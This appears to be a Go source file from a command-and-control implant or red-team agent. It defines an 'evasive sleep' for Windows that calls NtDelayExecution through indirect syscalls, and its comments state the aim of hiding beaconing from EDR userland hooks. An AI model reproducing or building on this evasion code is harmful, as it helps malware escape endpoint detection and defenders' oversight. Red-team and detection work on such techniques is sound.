//go:build windows

package commands

import (
	"time"
)

// AgentSleep performs an evasive sleep on Windows.
// It leverages NtDelayExecution via indirect syscalls (if available) to hide from userland hooks
// that EDRs inject into kernel32.Sleep and ntdll.NtDelayExecution to detect rhythmic beaconing.
func AgentSleep(d time.Duration) {
	if d <= 0 {
		return
	}

	if IndirectSyscallsAvailable() {
		// NtDelayExecution takes a delay interval in 100-nanosecond units.
		// A negative value specifies relative time.
		interval := int64(-d.Nanoseconds() / 100)

		status := IndirectNtDelayExecution(0, &interval)

		// STATUS_SUCCESS == 0x0. If it fails, fallback to normal time.Sleep
		if status == 0 {
			return
		}
	}

	// Fallback mechanism
	time.Sleep(d)
}
